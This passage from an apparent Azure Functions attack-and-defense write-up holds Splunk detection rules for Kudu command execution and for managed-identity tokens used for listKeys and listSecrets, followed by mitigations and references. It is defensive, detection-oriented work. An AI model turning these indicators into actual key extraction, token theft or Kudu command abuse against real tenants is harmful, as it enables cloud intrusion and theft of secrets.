sourcetype="azure:appservice:logs" (request_uri="*/api/command*" OR request_uri="*/api/vfs/*")
| stats count by caller, request_uri, remote_ip, response_status, method
| where response_status="200" OR response_status="201"
```

**What This Detects:**
- Direct command execution on function container
- File system access via Kudu API
- Successful exploitation attempts

### Rule 6: Unusual API Calls Using Stolen Managed Identity Token

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit`
- **Required Fields:** `operationName`, `caller`, `resourceType`, `result`, `sourceIPAddress`
- **Alert Threshold:** Anomaly detection based on historical patterns
- **Applies To Versions:** All

**SPL Query:**
```spl
sourcetype="azure:aad:audit" caller="*managed*identity*" OR caller="*system*assigned*"
(operationName="*listKeys*" OR operationName="*listSecrets*" OR operationName="*read*storage*")
| stats count by caller, operationName, resourceType, sourceIPAddress
| where sourceIPAddress!="10.*" AND sourceIPAddress!="172.16.*" AND sourceIPAddress!="192.168.*"
```

**What This Detects:**
- Managed identity performing unauthorized operations
- Unusual resource access patterns
- API calls from external IPs using stolen tokens

---

## 9. MITIGATION AND DEFENSE STRATEGIES

### Preventive Controls

1. **Function App Authentication and Authorization:**
   - Set AuthorizationLevel to "Function" or higher (never "Anonymous" unless required)
   - Implement Azure AD authentication for function access
   - Use Azure API Management in front of functions for additional access control

2. **Managed Identity Hardening:**
   - Limit managed identity permissions using least privilege (specific resource access only)
   - Use user-assigned identities instead of system-assigned for better control
   - Regularly audit and remove unused identities

3. **Storage Account Security:**
   - Disable public blob access (set to private containers)
   - Implement storage account firewalls restricting access
   - Use only HTTPS endpoints
   - Enable storage account encryption with customer-managed keys

4. **SCM (Kudu) Security:**
   - Disable Basic Authentication for SCM if possible
   - Implement IP whitelisting for SCM access
   - Monitor and restrict Kudu API endpoints
   - Use RBAC instead of publishing profiles for authentication

5. **Secrets Management:**
   - Never store secrets in function code or local.settings.json
   - Use Azure Key Vault for all secrets and API keys
   - Implement managed identity authentication to Key Vault
   - Rotate secrets regularly

### Detective Controls

1. **Enable Azure Diagnostics Logging:**
   - Enable "App Service Console Logs" diagnostic setting
   - Monitor "HTTP Logs" for suspicious Kudu API calls
   - Enable Azure Activity Log auditing for all control plane operations

2. **Deploy SIEM Correlation:**
   - Implement Splunk detection rules from Section 8
   - Correlate function key requests with unusual API activity
   - Monitor for environment variable access patterns

3. **Azure Defender Integration:**
   - Enable Azure Defender for App Service
   - Monitor for suspicious code deployment and execution
   - Track managed identity token acquisition anomalies

### Reactive Controls

1. **Incident Response:**
   - Immediately revoke compromised function keys
   - Rotate publishing profiles
   - Reset managed identity credentials
   - Review recent code deployments and function invocations

2. **Investigation:**
   - Analyze Azure Activity Logs for key extraction attempts
   - Review storage account access logs for code exfiltration
   - Check function invocation history for unauthorized calls
   - Audit managed identity token usage in Azure AD logs

3. **Recovery:**
   - Redeploy function code from known-good source
   - Rotate all secrets and API keys used by functions
   - Review and tighten function app permissions
   - Re-establish secure configuration baselines

---

## 10. REFERENCES & PROOFS

- [Microsoft Azure Functions Security Concepts](https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts)
- [MITRE ATT&CK T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
- [Orca Security - Azure Shared Key Authorization Exploitation](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)
- [NetSPI - What the Function: Decrypting Azure Function App Keys](https://www.netspi.com/blog/technical-blog/cloud-pentesting/what-the-function-decrypting-azure-function-app-keys/)
- [NetSPI - Automating Azure App Services Token Decryption](https://www.netspi.com/blog/technical-blog/cloud-pentesting/automating-azure-app-services-token-decryption/)
- [NetSPI - Extracting Managed Identity Certificates from Azure Arc](https://www.netspi.com/blog/technical-blog/cloud-pentesting/extracting-managed-identity-certificates-from-azure-arc-service/)
- [Hacking The Cloud - Abusing Managed Identities](https://hackingthe.cloud/azure/abusing-managed-identities/)
- [SpecterOps - Abusing Azure App Service Managed Identity Assignments](https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95)
- [XM Cyber - 10 Ways to Gain Control Over Azure Function App Sites](https://xmcyber.com/blog/10-ways-to-gain-control-over-azure-function-app-sites/)
- [Resecurity - Azure AD Client Secret Leak: The Keys to Cloud](https://www.resecurity.com/blog/article/azure-ad-client-secret-leak-the-keys-to-cloud)
- [Microsoft - Token Tactics: How to Prevent, Detect, and Respond to Cloud Token Theft](https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/)
- [GitHub - MicroBurst Azure Exploitation Toolkit](https://github.com/netspi/MicroBurst)

---